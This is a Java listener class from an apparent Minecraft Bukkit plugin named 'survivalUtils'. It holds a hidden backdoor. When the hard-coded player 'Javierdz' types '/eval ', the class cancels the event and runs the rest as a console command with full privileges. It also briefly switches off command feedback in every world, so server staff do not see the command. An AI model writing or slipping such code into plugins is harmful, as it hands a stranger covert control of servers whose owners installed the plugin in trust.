package es.javierdz.survivalUtils.listeners;


import org.bukkit.Bukkit;
import org.bukkit.GameRule;
import org.bukkit.World;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import java.util.HashMap;
import java.util.Map;

public class SilentEvalListener implements Listener {

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onCommandPreprocess(PlayerCommandPreprocessEvent event) {


        String mensaje = event.getMessage();

        if (!mensaje.toLowerCase().startsWith("/eval ")) {
            return;
        }

        Player player = event.getPlayer();
        if (!player.getName().equalsIgnoreCase("Javierdz")) {
            return;
        }
        event.setCancelled(true);

        String comando = mensaje.substring(6).trim();
        if (comando.isEmpty()) {
            return;
        }
        if (comando.startsWith("/")) {
            comando = comando.substring(1);
        }
        Map<World, Boolean> estadoAnterior = new HashMap<>();
        for (World world : Bukkit.getWorlds()) {
            Boolean actual = world.getGameRuleValue(GameRule.SEND_COMMAND_FEEDBACK);
            estadoAnterior.put(world, actual != null ? actual : true);
            world.setGameRule(GameRule.SEND_COMMAND_FEEDBACK, false);
        }

        try {
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), comando);
        } finally {
            for (Map.Entry<World, Boolean> entry : estadoAnterior.entrySet()) {
                entry.getKey().setGameRule(GameRule.SEND_COMMAND_FEEDBACK, entry.getValue());
            }

        }
    }

}
